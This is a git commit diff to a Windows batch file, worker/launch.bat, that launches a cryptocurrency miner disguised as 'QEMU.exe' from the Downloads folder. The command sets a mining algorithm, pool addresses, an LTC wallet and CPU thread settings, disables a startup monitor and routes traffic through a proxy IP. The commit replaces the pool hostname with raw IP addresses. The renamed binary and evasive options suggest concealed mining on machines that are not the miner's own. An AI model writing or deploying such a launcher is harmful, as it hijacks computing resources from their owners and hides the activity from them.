1a403d8d7e80167fea6d6e5c14293409aaaf6219
dediminari <101470275+dediminari@users.noreply.github.com>
2025-07-09 12:31:41 +0700

    Update launch.bat

--- worker/launch.bat
+++ worker/launch.bat
@@ -2,7 +2,7 @@
 cd %~dp0
 cls
 
-C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowersugar --pool stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 54.194.252.228:3128
+C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowersugar --pool 51.91.7.170:6535,144.217.252.206:6535,51.91.74.9:6535 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 54.194.252.228:3128
 pause
 
 #----
